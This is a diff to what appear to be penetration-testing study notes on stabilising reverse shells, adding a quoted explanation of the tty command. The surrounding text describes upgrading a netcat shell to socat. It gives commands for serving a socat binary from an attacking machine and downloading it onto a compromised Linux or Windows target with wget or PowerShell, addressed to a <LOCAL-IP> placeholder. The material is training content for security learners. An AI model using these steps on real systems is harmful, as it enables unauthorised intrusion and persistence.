@@ -121,6 +121,10 @@ to stabilise and re-enter the shell.
 -----------------------------------
 Technique 3: Socat
 
+[Note: in order to understand the information regarding tty and stty see here: https://www.geeksforgeeks.org/tty-command-in-linux-with-examples/ and here: https://youtu.be/WnjofnvIIvg. The following quote is from the first source: 
+"Linux operating system represents everything in a file system, the hardware devices that we attach are also represented as a file. The terminal is also represented as a file. There a command exists called tty which displays information related to terminal. The tty command of terminal basically prints the file name of the terminal connected to standard input. tty is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system."]
+
+
 The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).
 
 For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.
